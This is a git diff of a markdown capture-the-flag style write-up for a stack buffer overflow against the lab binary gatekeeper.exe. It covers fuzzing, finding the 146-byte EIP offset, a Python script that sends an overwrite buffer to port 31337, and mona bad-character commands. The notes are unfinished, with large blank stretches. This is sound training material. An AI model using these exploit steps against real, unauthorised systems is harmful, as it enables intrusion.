@@ -31,8 +31,6 @@
 
 ---
 
---- 
-
 ### Mona Configuration
 
 - The mona script has been preinstalled, however to make it easier to work with, you should configure a working folder using the following command, which you can run in the command input box at the bottom of the Immunity Debugger window:
@@ -62,154 +60,6 @@
 ---
 
 ### 1. Fuzzing
-
-- The fuzzer will send increasingly long strings comprised of `A`. 
-    
-- If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. 
-    
-- Make a note of the largest number of bytes that were sent.
-
-- **Local IPv4 Version `192.168.1.100`**
-
-    - `gate_overflow_step1_fuzzing.py` (chmod +x)
-
-```python
-#!/usr/bin/env python3
-
-import socket, time, sys
-
-ip = "192.168.1.100"
-
-port = 31337
-timeout = 5
-
-string = "A" * 100
-
-while True:
-  try:
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-      s.settimeout(timeout)
-      s.connect((ip, port))
-      s.recv(1024)
-      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
-      s.send(bytes(string, "latin-1"))
-      s.recv(1024)
-  except:
-    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
-    sys.exit(0)
-  string += 100 * "A"
-  time.sleep(1)
-```
-
-- ![image](https://user-images.githubusercontent.com/94720207/169685462-1b52f76f-c40a-4762-8bc0-f465c65e0f40.png)
-
-    - **Execute it:**
-
-        - **`python3 gate_overflow_step1_fuzzing.py`**
-    
-    - ![image](https://user-images.githubusercontent.com/94720207/169674064-e5f1e173-7342-4e1e-848a-0e9350bf70b1.png)
-        
-    - ![image](https://user-images.githubusercontent.com/94720207/169674167-39262a16-968f-40c1-a052-d7fd0f302d61.png)
- 
-- **Results:**
-
-- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 
-        
-    - _Note: Restart the Lab after the crash._ 
-
----
-
-### 2. Crash Replication
-
-
-
-
-
----
----
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
----
----
-----
----
-
----
-
-### Buffer Overflow
-
-- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:
-
-- **Steps to conduct a buffer overflow:**
-
-    1. _Spiking - Method to find vuln part of the program_ Not necessary in this Lab
-    2. Fuzzing - Send a bunch of characters and see if we can break it
-    4. Finding the Offset - At what point did we break it
-    5. Overwriting the EIP - Overwriting the Poiting Address and control it
-    6. Finding Bad Characters - ...
-    7. Finding the Right Module - ...
-    8. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
-    9. Root!
-
----
-
-### Fuzzing
 
 - First of all, I will run `gatekeeper.exe` as administrator and then start `Immunity Debugger` and attach the program. 
     
@@ -299,7 +149,7 @@ print "A" * 5000
 
 ---  
 
-### Finding the Offset
+### 2. Finding the Offset
 
 - First of all, restart everything because the last crash...
 
@@ -375,6 +225,171 @@ print "A" * 5000
             - That's why I used 5000 bytes again in this lab, so spiking is now clear! :D**  
         
             - **This information is critical, because this means that exactly at `146 bytes`, we can control `EIP` overwriting it**
+
+### Results
+
+- **Crashing with an exact offset of `146` bytes**
+
+---
+
+### 3. Controlling EIP
+
+1. Create a new python script called `overflow_gatekeeper_controllingEIP.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**.
+  
+    - Offset: `146` bytes 
+
+2. Set the `payload` variable to an **empty string**. 
+
+3. Set the `retn` variable to `BBBB`.
+
+    - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 
+
+- **Note: Executing the next script is not necessary for the exploit, so, from here you can only make the script and save it for the next step**
+
+- Create:
+
+    - `overflow_gatekeeper_controllingEIP.py` (chmod +x)
+
+```python
+import socket
+
+ip = "192.168.1.100"
+port = 31337
+
+prefix = ""
+offset = 146
+overflow = "A" * offset
+retn = "BBBB"
+padding = ""
+payload = ""
+postfix = ""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+try:
+  s.connect((ip, port))
+  print("Sending evil buffer...")
+  s.send(bytes(buffer + "\r\n", "latin-1"))
+  print("Done!")
+except:
+  print("Could not connect.")
+```
+- ![image](https://user-images.githubusercontent.com/94720207/169674891-1c4ecc23-5571-4dc0-a23b-8e73278c2808.png)
+
+    - **Execute it:**
+
+        - **`overflow1_step3_controllingEIP.py`**
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169674956-b6c8fa60-0e9c-4fab-80b8-9c479ccb2f1e.png)
+        
+    - ![image](https://user-images.githubusercontent.com/94720207/169674990-141ae8c6-d03d-4304-ae11-481d9294fc87.png)
+
+- The EIP register should now be overwritten with the 4 B's (e.g. 42424242).
+
+### Results
+
+
+
+---
+
+### 4. Finding Bad Characters
+
+- Generate a `bytearray` using `mona`, and **exclude the null byte `\x00` by default.** 
+
+- Note the location of the `bytearray.bin` file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be `C:\mona\oscp\bytearray.bin`).
+
+    - `!mona bytearray -b "\x00"`
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169675140-ff7dd2ea-207e-4318-ab84-7b22a94af7b9.png)
+    
+- Now, generate a string of bad chars from \x01 to \xff**:
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---
+---
+----
+---
+
+---
+
+### Buffer Overflow
+
+- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:
+
+- **Steps to conduct a buffer overflow:**
+
+    1. _Spiking - Method to find vuln part of the program_ Not necessary in this Lab
+    2. Fuzzing - Send a bunch of characters and see if we can break it
+    4. Finding the Offset - At what point did we break it
+    5. Overwriting the EIP - Overwriting the Poiting Address and control it
+    6. Finding Bad Characters - ...
+    7. Finding the Right Module - ...
+    8. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
+    9. Root!
+
+---
+
+
+
+
 
 ---
 
